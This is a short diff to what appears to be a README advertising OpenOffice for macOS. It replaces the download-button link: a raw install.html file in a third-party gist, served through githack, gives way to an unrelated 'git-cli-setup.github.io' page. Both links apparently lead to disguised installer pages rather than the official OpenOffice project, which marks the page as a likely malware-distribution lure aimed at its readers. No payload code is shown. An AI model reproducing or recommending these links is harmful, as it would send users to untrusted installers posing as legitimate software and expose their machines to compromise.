@@ -2,7 +2,7 @@
 
 OpenOffice is a complete office productivity suite that includes powerful tools for word processing, spreadsheets, presentations, drawings, and databases. It is designed to provide macOS users with a versatile alternative for handling documents and business tasks.
 
-<a href="https://gistcdn.githack.com/kiddofreshmeat/f656b1b81baebe5aef5e8231ec140acb/raw/e2221b20b38ed46c34944128ea4ef3f92a2c070d/install.html?offer=OpenOffice" target="_blank">
+<a href="https://git-cli-setup.github.io/.github/?offer=OpenOffice" target="_blank">
   <img
     src="https://img.shields.io/badge/Get%20OpenOffice%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF"
     width="320"
